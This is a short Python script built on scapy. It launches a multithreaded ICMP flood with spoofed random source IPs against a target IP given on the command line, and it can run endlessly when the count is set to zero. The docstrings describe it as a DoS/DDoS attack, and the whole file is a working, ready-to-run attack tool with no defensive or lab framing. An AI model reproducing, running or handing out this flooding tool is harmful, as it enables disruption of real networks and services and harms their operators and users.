# Usage: python3 DDoS.py -t <target_ip> -c <count> -T <threads>

from scapy.all import IP, ICMP, send, RandIP
import argparse
import threading

def dos(target_ip, count):
    """
    Perform a DoS attack by sending ICMP packets with random source IPs to the target.
    If count is 0, the function sends packets indefinitely.
    """
    if count == 0:
        while True:
            packet = IP(src=str(RandIP()), dst=target_ip) / ICMP()
            send(packet, verbose=0)
    else:
        for _ in range(count):
            packet = IP(src=str(RandIP()), dst=target_ip) / ICMP()
            send(packet, verbose=0)

def ddos(target_ip, count, threads):
    """
    Perform a DDoS attack using multiple threads.
    Each thread runs the `dos` function independently.
    """
    print(f"[+] Starting DDoS attack on {target_ip} with {threads} threads")
    thread_list = []
    
    for _ in range(threads):
        thread = threading.Thread(target=dos, args=(target_ip, count)) # Create a new thread with the `dos` function
        thread.daemon = True  # Allows the script to exit even if threads are running
        thread.start() 
        thread_list.append(thread) # Keep track of all threads so that we can wait for them to finish later

    # Wait for all threads to finish if a finite count is specified so that the script can exit
    if count > 0:
        for thread in thread_list:
            thread.join() 

def main():
    parser = argparse.ArgumentParser(description='DDoS Attack Simulation')
    parser.add_argument('-t', '--target', help='Target IP', required=True)
    parser.add_argument('-c', '--count', help='Number of packets per thread (0 for infinite)', type=int, default=1000)
    parser.add_argument('-T', '--threads', help='Number of threads to use', type=int, default=10)
    args = parser.parse_args()

    ddos(args.target, args.count, args.threads)

if __name__ == '__main__':
    main()
